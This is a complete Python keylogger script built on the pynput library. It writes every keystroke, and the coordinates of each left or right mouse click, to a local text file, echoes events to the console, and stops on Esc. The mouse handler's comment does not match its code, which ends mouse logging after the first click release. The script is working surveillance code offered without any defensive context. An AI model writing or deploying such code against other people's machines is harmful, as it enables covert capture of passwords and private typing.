from pynput import keyboard, mouse

# Function to log keyboard events
def keyPressed(key):
    try:
        # Try to log regular characters
        char = key.char
        if char:
            with open("keyfile.txt", 'a') as logKey:
                logKey.write(char)
        
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        with open("keyfile.txt", 'a') as logKey:
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.backspace:
                logKey.write('[BACKSPACE]')
            else:
                logKey.write(f'[{str(key)}]')

    # Print the key to the console
    print(str(key))

    # Stop the listener if Esc key is pressed
    if key == keyboard.Key.esc:
        return False  # This stops the listener

# Function to log mouse events (left and right click)
def on_click(x, y, button, pressed):
    with open("keyfile.txt", 'a') as logKey:
        if pressed:
            if button == mouse.Button.left:
                logKey.write(f'[LEFT CLICK at ({x}, {y})]\n')
            elif button == mouse.Button.right:
                logKey.write(f'[RIGHT CLICK at ({x}, {y})]\n')

    # Print the mouse event to the console
    print(f'{button} {"Pressed" if pressed else "Released"} at ({x}, {y})')

    # Stop the listener if Esc key is pressed
    if not pressed:
        return False  # This stops the listener when the mouse button is released (optional)

if __name__ == "__main__":
    # Set up listener for keyboard and mouse events
    keyboard_listener = keyboard.Listener(on_press=keyPressed)
    mouse_listener = mouse.Listener(on_click=on_click)

    # Start the listeners
    keyboard_listener.start()
    mouse_listener.start()

    # Keeps the program running
    keyboard_listener.join()
    mouse_listener.join()
